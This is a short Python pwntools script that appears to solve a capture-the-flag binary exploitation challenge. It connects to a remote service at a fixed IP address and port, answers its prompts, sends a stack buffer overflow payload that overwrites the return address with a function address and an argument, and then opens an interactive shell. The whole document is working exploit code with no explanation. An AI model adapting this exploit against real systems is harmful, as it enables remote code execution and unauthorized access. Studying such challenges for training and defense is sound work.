from pwn import *

context.log_level = 'debug'

#cn = process('pwn2')
cn = remote('128.199.220.74',10001)

cn.recvuntil('[Y/N]\n')
cn.sendline('Y')
cn.recvuntil('name:\n')
pay = 'a'*0x14 + p32(0x08048537) + p32(0x08048780)
cn.send(pay)
cn.interactive()
